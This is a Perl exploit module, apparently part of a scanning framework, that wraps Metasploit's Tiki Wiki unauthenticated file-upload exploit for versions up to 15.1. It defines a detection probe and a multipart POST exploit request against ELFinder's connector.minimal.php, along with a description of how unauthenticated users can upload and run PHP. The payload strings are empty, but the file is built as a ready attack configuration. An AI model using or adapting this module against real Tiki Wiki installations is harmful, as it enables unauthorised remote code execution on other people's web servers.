package MSFExploits::Exploits::TIKIWIKI::MSF::TikiwikiUploadExec;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::TIKIWIKI);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "TikiwikiUploadExec";

   my $DETECTION = {
  METHOD => 'POST',
  PATH => '/vendor_extra/elfinder/php/connector.minimal.php',
  PAYLOAD => '',
  TEXT => 'Checking If : /vendor_extra/elfinder/php/connector.minimal.php Exists ...',
  VALIDATION   => {
    TCODE => ['200'],
  },
   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits a file upload vulnerability in Tiki Wiki <= 15.1

        which could be abused to allow unauthenticated users to execute arbitrary code

        under the context of the web server user.



        The issue comes with one of the 3rd party components. Name of that component is

        ELFinder -version 2.0-. This component comes with default example page which

        demonstrates file operations such as upload, remove, rename, create directory etc.

        Default configuration does not force validations such as file extension, content-type etc.

        Thus, unauthenticated user can upload PHP file.



        The exploit has been tested on Debian 8.x 64-bit and Tiki Wiki 15.1.

      ",
  METHOD      => "POST",
  MSF_MODULE  => "tikiwiki_upload_exec",
  REFERENCES  => [
                   "https://www.mehmetince.net/exploit/tiki-wiki-unauthenticated-file-upload-vulnerability",
                   "https://tiki.org/article434-Security-update-Tiki-15-2-Tiki-14-4-and-Tiki-12-9-released",
                 ],
  TITLE       => "Tiki Wiki Unauthenticated File Upload Vulnerability",


  TYPE => 'MSF',
  PLATFORM => 'UNIX',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'vendor_extra/elfinder/php/connector.minimal.php',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [POST] /vendor_extra/elfinder/php/connector.minimal.php',
      HEADERS      => {
        'Content-Type' => 'multipart/form-data; boundary=_Part_14_3729839089_1782495492',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
